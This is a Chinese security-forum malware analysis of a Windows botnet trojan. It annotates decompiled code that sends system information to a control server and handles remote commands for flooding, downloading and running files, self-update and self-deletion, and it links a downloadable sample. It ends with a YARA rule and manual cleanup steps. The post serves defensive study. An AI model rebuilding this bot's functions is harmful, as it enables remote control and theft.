
创建个线程 该线程成为僵尸线程.

继续深入.

![](https://bbs.kanxue.com/upload/attach/201705/720407_z8emqgcilx65ybe.png)

```
hSocket = Init_connect();                     // 网络初始化 连接 返回句柄
g_Socket = hSocket;
if (hSocket != -1)
{
Sock_Control(hSocket, 75);                  // 设置SOCKET的套接字模式
memset(&Dst, 0, 176u);
Get_SysInfo((int)&Dst);                     // 获取用户的电脑的操作系统的版本信息、CPU处理的频率和数目信息、系统的内存信息以、使用的网络流量的信息以及用户电脑从启动到现在的上线时间，准备将用户的这些信息发送给病毒作者。
if (Load_hra33() == 1)                    // 载入DLL
v52 += 2;
v53 += 3;
v54 += 4;
*(_DWORD *)buf = 176;
SwitchNumber = 0x77;
memcpy(SysInfo, &Dst, 176u);
if (send(g_Socket, buf, 184, 0) != -1)    // 将信息发送服务器
肉鸡已上线。。
}
```

加载`URLDOWNTOFILEA`函数  等待死循环等待服务器的指令

![](https://bbs.kanxue.com/upload/attach/201705/720407_x90jhwsm2gifxcx.png)

![](https://bbs.kanxue.com/upload/attach/201705/720407_3gaby1j95gq39qk.png)

这几个应该是一个自定义的结构体 无法还原  后面会一一用到  现在一个一个分析服务器都会发送哪些指令 来操作客户端

```
if (SwitchNumber > 6)
{
//搞事情.
}
else
{
if (SwitchNumber == 6)
{
//搞事情too.
}
}
```

SWTICH 一个一个分析:

`Case 5: //我猜测控制全局线程任务 避免损耗过大`

![](http://bbs.pediy.com/upload/attach/201705/720407_rrxemij458vpp0s.png)

case 2 3 都有不少混淆其他只有一个函数是正常的 举个栗子:

![](https://bbs.kanxue.com/upload/attach/201705/720407_apl6g6vf244jmds.png)![](https://bbs.kanxue.com/upload/attach/201705/720407_yopjxskts72d3sg.png)

```
case 2://根据网络传输的参数 指定连接某服务器地址 进行TCP连接 发垃圾包 关闭 循环自定义次数
break;
```

因IDA的BUG SEND没显示出来,这个故事再次告诉我们F5大法也有问题 我猜测这就是传说中的网络攻击器的肉鸡?

```
case 3://根据网络传输的参数 运行系统路径下指定程序可以带参数 可以指定运行多少次
break;
```

只有这段代码是有效的 其他的都是垃圾指令 根据功能是来攻击当前机器的用户 ..想想自定义次数打开某个东西.

```
case 4://等待任务/
break;
```

这个就没啥好看的 作者让用户机器暂时不接受任务.

```
case 5://猜测是控制全局线程任务 避免损耗过大 全局的BOOL值变量
break;
```

```
case 6://关闭互斥体 删除注册表的值 删除自身
break;
```

```
case 16://根据网络传输的参数 保存到临时文件 然后打开运行 支持传参运行
break;
```

`URLDOWNTOFILEA`函数应该是如下图 IDA手残点错了 把参数给搞没了.^_^

```
case 18://更新本身病毒 下载 运行 删除自身
break;
```

```
case 20://根据网络传输的URL 打开IE浏览器进行弹窗
break;
```

## 3．解决方案(或总结)

### 3.1 提取病毒的特征，利用杀毒软件查杀

`Ghijkl Nopqrstu Wxy` 的16进制字符串为 `4768696a6b6c204e6f70717273747520577879`

Yara规则配合ClamAV:

```
rule 3601Virs
{
    strings:
        $my_text_string = "Ghijkl Nopqrstu Wxy"
        $my_hex_string = {47 68 69 6a 6b 6c 20 4e 6f 70 71 72 73 74 75 20 57 78 79}
    condition:
        $my_text_string or $my_hex_string
}
```

![](http://bbs.pediy.com/upload/attach/201705/720407_400h1x8jg25y73h.png)

### 3.2 手工查杀步骤 查杀思路 。

通过服务名称 `Ghijkl Nopqrstu Wxy` 可以得到服务绑定的EXE程序

1. 停止服务
2. 删除注册表的键值
3. 删除服务绑定的EXE windows目录下
4. 找到system系统目录下 `hra33.dll` 删除
5. 删除所有非system32目录下的 `lpk.dll`

这个病毒不难 但是对于我们这种新手来说 需要花时间就能搞定了 此外 感谢15PB老师们的辛勤栽培!!!

[`HRA33.DLL`完整分析 `LPK.DLL` 的劫持 和感染ZIP RAR 实现细节](http://bbs.pediy.com/thread-217757.htm)**直通车**

**附件密码 pediy**

[[招生]科锐逆向工程师培训(2026年11月13日实地，远程教学同时开班, 第57期)](https://bbs.kanxue.com/thread-51839.htm)

上传的附件：

- [病毒样本.zip](javascript:void(0);)（21.64kb，136次下载）
